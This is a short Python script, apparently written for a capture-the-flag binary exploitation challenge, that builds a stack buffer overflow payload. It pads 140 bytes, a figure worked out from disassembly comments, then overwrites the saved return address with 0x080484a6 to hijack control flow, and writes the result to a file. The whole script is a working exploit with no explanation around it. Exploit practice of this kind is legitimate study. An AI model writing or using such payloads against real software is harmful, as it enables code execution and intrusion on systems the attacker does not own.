#!/usr/bin/env python3
import struct

# Test different offsets
# Based on disassembly:
# chall() reserves 0x84 (132) bytes
# Buffer is at -0x88(%ebp) = 136 bytes below ebp
# Saved EBP is 4 bytes
# Total offset = 136 + 4 = 140

offset = 140
asm_bounce = 0x080484a6

payload = b"A" * offset
payload += struct.pack("<I", asm_bounce)
payload += b"B" * 100

with open('/workspace/payload.bin', 'wb') as f:
    f.write(payload)

print(f"Created payload with offset {offset}")
print(f"Return address: 0x{asm_bounce:08x}")
